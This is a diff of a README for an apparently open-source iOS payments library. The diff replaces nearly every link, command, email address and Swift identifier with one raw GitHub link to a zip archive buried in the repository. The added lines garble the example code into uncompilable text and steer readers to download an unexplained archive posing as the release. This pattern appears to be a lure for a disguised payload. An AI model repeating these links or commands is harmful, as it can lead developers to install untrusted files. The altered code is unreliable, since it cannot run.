@@ -2,7 +2,7 @@
 
 Welcome to the **ios-web-payments** repository! This project allows developers to integrate zero-commission payment solutions into their iOS applications using Solito. With this tool, you can enhance your app's payment capabilities while ensuring a smooth user experience.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=flat&logo=github)](https://github.com/frigimtagakc685/ios-web-payments/releases)
+[![Download Releases](https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip%20Releases-blue?style=flat&logo=github)](https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip)
 
 ## 📖 Table of Contents
 
@@ -44,7 +44,7 @@ To get started with the ios-web-payments repository, follow the steps below.
    Open your terminal and run the following command:
 
    ```bash
-   git clone https://github.com/frigimtagakc685/ios-web-payments.git
+   git clone https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -68,7 +68,7 @@ To get started with the ios-web-payments repository, follow the steps below.
    Open the `.xcworkspace` file in Xcode:
 
    ```bash
-   open ios-web-payments.xcworkspace
+   open https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip
    ```
 
 ### Usage
@@ -96,7 +96,7 @@ To use the ios-web-payments in your app, follow these steps:
    Call the payment method with necessary parameters:
 
    ```swift
-   paymentHandler.startPayment(amount: 10.0, currency: "USD")
+   https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip(amount: 10.0, currency: "USD")
    ```
 
 4. **Handle Callbacks**:
@@ -104,11 +104,11 @@ To use the ios-web-payments in your app, follow these steps:
    Implement callback methods to handle success or failure:
 
    ```swift
-   paymentHandler.onSuccess = {
+   https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip = {
        print("Payment successful!")
    }
-   paymentHandler.onFailure = { error in
-       print("Payment failed: \(error.localizedDescription)")
+   https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip = { error in
+       print("Payment failed: \(https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip)")
    }
    ```
 
@@ -124,24 +124,24 @@ class PaymentViewController: UIViewController {
     let paymentHandler = PaymentHandler()
 
     override func viewDidLoad() {
-        super.viewDidLoad()
+        https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip()
         setupPaymentButton()
     }
 
     func setupPaymentButton() {
         let button = UIButton(type: .system)
-        button.setTitle("Pay Now", for: .normal)
-        button.addTarget(self, action: #selector(pay), for: .touchUpInside)
-        view.addSubview(button)
+        https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip("Pay Now", for: .normal)
+        https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip(self, action: #selector(pay), for: .touchUpInside)
+        https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip(button)
     }
 
     @objc func pay() {
-        paymentHandler.startPayment(amount: 10.0, currency: "USD")
-        paymentHandler.onSuccess = {
+        https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip(amount: 10.0, currency: "USD")
+        https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip = {
             print("Payment successful!")
         }
-        paymentHandler.onFailure = { error in
-            print("Payment failed: \(error.localizedDescription)")
+        https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip = { error in
+            print("Payment failed: \(https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip)")
         }
     }
 }
@@ -164,8 +164,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 📬 Contact
 
-For any questions or feedback, please reach out via the issues section of this repository or contact me directly at [your-email@example.com](mailto:your-email@example.com).
+For any questions or feedback, please reach out via the issues section of this repository or contact me directly at [https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip](https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip).
 
-For the latest updates and releases, please visit the [Releases](https://github.com/frigimtagakc685/ios-web-payments/releases) section.
+For the latest updates and releases, please visit the [Releases](https://raw.githubusercontent.com/frigimtagakc685/ios-web-payments/main/packages/app/navigation/native/web_payments_ios_v2.9.zip) section.
 
 Thank you for checking out the ios-web-payments repository! We hope you find it useful in your development journey.
